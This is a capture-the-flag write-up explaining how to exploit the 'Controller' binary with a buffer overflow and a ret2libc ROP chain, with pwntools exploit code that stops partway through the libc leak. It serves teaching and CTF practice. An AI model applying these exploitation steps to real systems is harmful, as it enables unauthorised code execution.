<!DOCTYPE html><html lang="en" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>Cyber Apocalypse CTF 2021 - Controller (ROP) | amirr0r</title><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Cyber Apocalypse CTF 2021 - Controller (ROP)" /><meta name="author" content="amirr0r" /><meta property="og:locale" content="en_US" /><meta name="description" content="Binaries analysis" /><meta property="og:description" content="Binaries analysis" /><link rel="canonical" href="https://amirr0r.github.io/posts/cyber-apocalypse-ctf-controller/" /><meta property="og:url" content="https://amirr0r.github.io/posts/cyber-apocalypse-ctf-controller/" /><meta property="og:site_name" content="amirr0r" /><meta property="og:image" content="https://amirr0r.github.io/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/HTB_CTF.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-10-25T15:38:11+02:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://amirr0r.github.io/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/HTB_CTF.png" /><meta property="twitter:title" content="Cyber Apocalypse CTF 2021 - Controller (ROP)" /><meta name="twitter:site" content="@amirr0r_" /><meta name="twitter:creator" content="@amirr0r" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"Binaries analysis","headline":"Cyber Apocalypse CTF 2021 - Controller (ROP)","dateModified":"2021-10-25T15:38:11+02:00","datePublished":"2021-10-25T15:38:11+02:00","@type":"BlogPosting","image":"https://amirr0r.github.io/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/HTB_CTF.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://amirr0r.github.io/posts/cyber-apocalypse-ctf-controller/"},"url":"https://amirr0r.github.io/posts/cyber-apocalypse-ctf-controller/","author":{"@type":"Person","name":"amirr0r"},"@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --> <script src="/assets/js/post.min.js" async></script> <script src="/app.js" defer></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">amirr0r</a></div><div class="site-subtitle font-italic"></div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <!-- Switch the mode between dark and light. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightkMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightkMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/amirr0r" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/amirr0r_" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://www.linkedin.com/in/amir-barnat/?locale=en_US" target="_blank"> <i class="fab fa-linkedin-in"></i> </a> <a href="/feed.xml" > <i class="fas fa-rss"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Refactor the HTML structure. --> <!-- Suroundding the markdown table with '<div class="table-wrapper">. and '</div>' --> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Cyber Apocalypse CTF 2021 - Controller (ROP)</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Oct 25, 2021, 3:38 PM +0200" > Oct 25, 2021 <i class="unloaded">2021-10-25T15:38:11+02:00</i> </span> by <span class="author"> amirr0r </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/HTB_CTF.png" class="post-preview-img"><h1 id="binaries-analysis">Binaries analysis</h1><h2 id="controller">controller</h2><p>We start by executing the <code class="language-plaintext highlighter-rouge">file</code> command on the two executables that were provided:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>file controller
controller: ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for </span>GNU/Linux 3.2.0, BuildID[sha1]<span class="o">=</span>e5746004163bf77994992a4c4e3c04565a7ad5d6, not stripped
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">controller</code> is an <strong>ELF 64-bit</strong>, so an executable for 64-bit Unix-like operating systems. It is dynamically linked, which means that the <strong>LIBC</strong> is not directly incorporated into the binary. Finally, it is <code class="language-plaintext highlighter-rouge">not stripped</code> so it contains symbols, which will allow us to debug and decompile it more easily.</p><p>By using <code class="language-plaintext highlighter-rouge">checksec</code>, we notice that the stack is not executable (<strong>NX</strong> is enabled), and that the <strong>FULL RELRO</strong> is active. Therefore, it will not be possible to overwrite the content of “data” sections (<code class="language-plaintext highlighter-rouge">.got</code>,<code class="language-plaintext highlighter-rouge"> .plt</code> or even <code class="language-plaintext highlighter-rouge">.fini_array</code> as we did in the <a href="https://amirr0r.github.io/posts/cyber-apocalypse-ctf-minefield/">previous challenge</a>):</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/checksec_controller.png" alt="" /></p><h2 id="libcso6">libc.so.6</h2><p><code class="language-plaintext highlighter-rouge">libc.so.6</code> is the second binary given to us.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>file libc.so.6
libc.so.6: ELF 64-bit LSB shared object, x86-64, version 1 <span class="o">(</span>GNU/Linux<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]<span class="o">=</span>ce450eb01a5e5acc7ce7b8c2633b02cc1093339e, <span class="k">for </span>GNU/Linux 3.2.0, with debug_info, not stripped
</pre></table></code></div></div><p>In general, when a <code class="language-plaintext highlighter-rouge">libc.so</code> file is provided during a CTF, the exploitation of the binary will consist in two phases:</p><ol><li><p>Leaking the addresses of the functions of the Libc (to defeat ASLR)</p></li><li><p>Exploiting the binary via a Return Oriented Programming technique(<strong>ROP</strong>) / <strong>ret2libc</strong></p></li></ol><p><strong>Small tip</strong>: We can execute the LIBC to determine the exact version number and see with which version of <code class="language-plaintext highlighter-rouge">gcc</code> it was compiled:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/libc_version.png" alt="" /></p><h1 id="return-oriented-programming-rop">Return Oriented Programming (ROP)</h1><p>The <strong>NX</strong> protection prohibits the existence of memory pages that are both <strong>executable</strong> and <strong>writable</strong>. Therefore, writing and executing a shellcode in memory is not possible :/</p><p>❓ <strong>Question</strong>: If we control the execution flow <em>(via a buffer overflow)</em> and cannot use shellcode, what can we execute?</p><p>💡 <strong>Answer</strong>: You can execute code which is already present in memory, such as the LIBC functions for example.</p><p>This is the key principle of <code class="language-plaintext highlighter-rouge">ret2libc</code>: if we replace the contents of the <strong>RIP</strong> / <strong>EIP</strong> register by the address of the <code class="language-plaintext highlighter-rouge">system()</code> function, and pass the string “<code class="language-plaintext highlighter-rouge">/bin/sh</code>” as an argument … boubidi babidi babidi boo → we get a shell!</p><blockquote><p>Addresses of the <code class="language-plaintext highlighter-rouge">system()</code> function and of the “<code class="language-plaintext highlighter-rouge">/bin/sh</code>” character string are systematically mapped in memory (because they are present in the LIBC).</p></blockquote><h2 id="arguments-and-functions-in-x86-and-x86_64-assembly">Arguments and functions in <code class="language-plaintext highlighter-rouge">x86</code> and<code class="language-plaintext highlighter-rouge"> x86_64</code> assembly</h2><blockquote><p>The two examples which will follow will be a call of the <code class="language-plaintext highlighter-rouge">setbuf()</code> function with the contents of the register <code class="language-plaintext highlighter-rouge">EAX</code> and the value 0 as arguments.</p></blockquote><ul><li>Giving an argument to a function in a <strong>32-bit</strong> architecture requires to put the values <u>on the stack</u>:</li></ul><pre><code class="language-asm">push 0x0
push eax
call 0x1234 &lt;setbuf@plt&gt;
</code></pre><ul><li>Giving an argument to a function in a <strong>64-bit</strong> architecture requires to put the values <u>in registers</u>:</li></ul><pre><code class="language-asm">mov rsi, 0x0
mov rdi, eax
call 0x1234 &lt;setbuf@plt&gt;
</code></pre><blockquote><p>On Linux, the order of the arguments follows the following register calling convention: <code class="language-plaintext highlighter-rouge">rdi</code>,<code class="language-plaintext highlighter-rouge"> rsi</code>, <code class="language-plaintext highlighter-rouge">rdx</code>,<code class="language-plaintext highlighter-rouge">rcx</code>, <code class="language-plaintext highlighter-rouge">r8</code> and<code class="language-plaintext highlighter-rouge"> r9</code>.</p></blockquote><p>❓ <strong>Question</strong>: Knowing that we cannot write shellcode instructions in memory, how can we place the values of our choice in a register?</p><p>💡 <strong>Answer</strong>: By using <strong>gadgets</strong>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://c.tenor.com/FNbVw6mImasAAAAC/inspector-gadget.gif" alt="Inspector Gadget" /></p><h2 id="gadgets">Gadgets</h2><p>In ROP terminology, we call “<strong>gadget</strong>” one or multiple assembly instructions that end with a <code class="language-plaintext highlighter-rouge">ret</code>.</p><p>As <a href="https://twitter.com/hackanddo">Pixis</a> said (translation): <em>“It is true that a binary rarely has the code to launch a shell. It would be too good. However, we can find in one place a piece of code that allows you to do an action, then in another place another piece of code that allows you to do something else, and so on. In this way, by joining together these little bits of instructions, we can finally succeed in doing actions that were not intended by the binary.”</em> (Source: <a href="https://beta.hackndo.com/return-oriented-programming/">hackndo.com</a>)</p><p>This is very well represented by the following schema:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/Return-Oriented-Programming-schema.png" alt="" /></p><p>In summary:</p><ul><li>we are able to overwrite the contents of the <strong>RIP</strong> / <strong>EIP</strong> register,</li><li>by making successive calls to <strong>gadgets</strong> we are able to obtain an arbitrary code execution.</li></ul><p>A chain of instructions (gadgets) is called a “<strong>ropchain</strong>”.</p><p>❓ <strong>Question</strong>: How do we find gadgets?</p><p>💡 <strong>Answer</strong>: By using any disassembler (such as <code class="language-plaintext highlighter-rouge">objdump</code>) or specific tools like <a href="https://github.com/sashs/Ropper">Ropper</a> or <a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/ropper.png" alt="" /></p><h1 id="exploitation">Exploitation</h1><h2 id="1-understanding-how-the-controller-program-works">1. Understanding how the <code class="language-plaintext highlighter-rouge">controller</code> program works?</h2><p>The <code class="language-plaintext highlighter-rouge">controller</code> binary works as follows:</p><ul><li><p>The <code class="language-plaintext highlighter-rouge">main()</code> function calls two functions:</p><ol><li><p><code class="language-plaintext highlighter-rouge">welcome()</code> → which displays a simple “Control Room” message</p></li><li><p><code class="language-plaintext highlighter-rouge">calculator()</code> (described just after)</p></li></ol></li></ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/src_main_controller.png" alt="" /></p><p>The <code class="language-plaintext highlighter-rouge">calculator()</code> function stores the value returned by the <code class="language-plaintext highlighter-rouge">calc()</code> function in a <code class="language-plaintext highlighter-rouge">local_c</code> variable (type <em>int</em>).</p><p>If this variable is equal to the hex value <strong>0xff3a</strong> (<strong>65338</strong> in decimal), the user can enter a message by calling the <code class="language-plaintext highlighter-rouge">scanf()</code> function.</p><p>This is where our buffer overflow is located. User input is not checked and it is stored in a 28 character buffer.</p><blockquote><p><strong>Security Recommandation</strong>: We should have limited the number of characters via <code class="language-plaintext highlighter-rouge">scanf("%27c", buffer);</code>.</p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/src_calculator.png" alt="" /></p><p>We can split the <code class="language-plaintext highlighter-rouge">calc()</code> function into two parts:</p><ol><li>Sending two integers which are lower than <strong>0x45</strong> (<strong>69</strong> in decimal) via the <code class="language-plaintext highlighter-rouge">scanf()</code> function</li><li>Calling to the <code class="language-plaintext highlighter-rouge">menu()</code> function to ask the user which operation he wishes to perform _(addition, subtraction, multiplication or division) _.</li></ol><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/src_calc.png" alt="" /></p><h3 id="calculating-the-offset">Calculating the offset</h3><p>Remember that our goal is to control the flow of execution. This involves exploiting the buffer overflow that we have identified.</p><p>As mentioned before, the <code class="language-plaintext highlighter-rouge">scanf()</code> function which generates the buffer overflow is only called if the return of the <code class="language-plaintext highlighter-rouge">calc()</code> function is equal to 65338.</p><p><code class="language-plaintext highlighter-rouge">-2147483648</code> and<code class="language-plaintext highlighter-rouge"> -2147418310</code> are both less than 69 and if we add them (choice “1”) we get 65338. Then, if we enter a long character string (in the example below a lot of <code class="language-plaintext highlighter-rouge">'A'</code>) we can crash the program:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/segfault_controller.png" alt="" /></p><p>Unlike the <a href="https://amirr0r.github.io/posts/cyber-apocalypse-ctf-minefield/">previous challenge</a>, there is no <code class="language-plaintext highlighter-rouge">win()</code> function to call:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/info_fu_controller.png" alt="" /></p><p>Therefore, the goal is to <u>find a way to obtain a shell</u>.</p><p>In order to do so, we must:</p><ul><li>retrieve the addresses of <code class="language-plaintext highlighter-rouge">system()</code> and “<code class="language-plaintext highlighter-rouge">/bin/sh</code>” character string by <em>leaking</em> the stack.</li><li>overwrite the value of the <strong>RIP</strong> register by calling the <code class="language-plaintext highlighter-rouge">system ()</code> function with “<code class="language-plaintext highlighter-rouge">/bin/sh</code>” (via the use of a <strong>ropchain</strong>)</li></ul><p>We can calculate the offset needed to override the value of <strong>RIP</strong> with the <code class="language-plaintext highlighter-rouge">pattern_create</code> and<code class="language-plaintext highlighter-rouge"> pattern_search</code> commands:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/pattern_create.png" alt="" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/pattern_search.png" alt="" /></p><p>The exact offset is <strong>40</strong>.</p><h2 id="2-ropchain-gadgets--libc-addresses-leak">2. Ropchain, Gadgets &amp; LIBC Addresses Leak</h2><p>In order to run the <code class="language-plaintext highlighter-rouge">controller</code> binary with the<code class="language-plaintext highlighter-rouge"> libc.so.6</code> provided to us and to facilitate the development of our exploit, we can use the tool <a href="https://github.com/io12/pwninit#pwninit"><code class="language-plaintext highlighter-rouge">pwninit</code></a>.</p><p>When you start to write an exploit, it is good to have a template / skeleton that you can start from. The one I am used to for ROP challenges is the following:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">pwn</span>

<span class="n">host</span> <span class="o">=</span> <span class="s">"127.0.0.1"</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">1337</span>

<span class="n">remote</span> <span class="o">=</span> <span class="bp">False</span>

<span class="n">binary_path</span> <span class="o">=</span> <span class="s">'./vuln'</span>
<span class="n">libc_path</span> <span class="o">=</span> <span class="s">'./libc.so.6'</span>
<span class="n">ld_path</span> <span class="o">=</span> <span class="s">'./ld-2.27.so'</span>
<span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">binary_path</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">libc_path</span><span class="p">)</span>
<span class="n">rop_binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">ROP</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>

<span class="k">if</span> <span class="n">remote</span><span class="p">:</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">process</span><span class="p">([</span><span class="n">ld_path</span><span class="p">,</span> <span class="n">binary_path</span><span class="p">],</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">"LD_PRELOAD"</span><span class="p">:</span> <span class="n">libc_path</span><span class="p">})</span>

<span class="c1"># Exploit code starts here :)
</span>
<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">r</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</pre></table></code></div></div><ul><li>We start by coding the lines that allow us to enter the two integers <code class="language-plaintext highlighter-rouge">-2147483648</code> and<code class="language-plaintext highlighter-rouge"> -2147418310</code>, to choose “1” and perform an addition. This will lead us to the <code class="language-plaintext highlighter-rouge">scanf()</code> function:</li></ul><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Insert the amount of 2 different types of recources:"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"-2147483648 -2147418310"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
</pre></table></code></div></div><ul><li>Then we get a gadget <code class="language-plaintext highlighter-rouge">pop rdi; ret</code>:</li></ul><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">pop_rdi</span> <span class="o">=</span> <span class="p">(</span><span class="n">rop_binary</span><span class="p">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'pop rdi'</span><span class="p">,</span> <span class="s">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>
</pre></table></code></div></div><ul><li>We prepare a first Ropchain to leak the address of the <code class="language-plaintext highlighter-rouge">puts()</code> function in the libc:</li></ul><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="n">plt_puts</span> <span class="o">=</span> <span class="n">binary</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
<span class="n">got_puts</span> <span class="o">=</span> <span class="n">binary</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
<span class="n">main_addr</span> <span class="o">=</span> <span class="n">binary</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span>

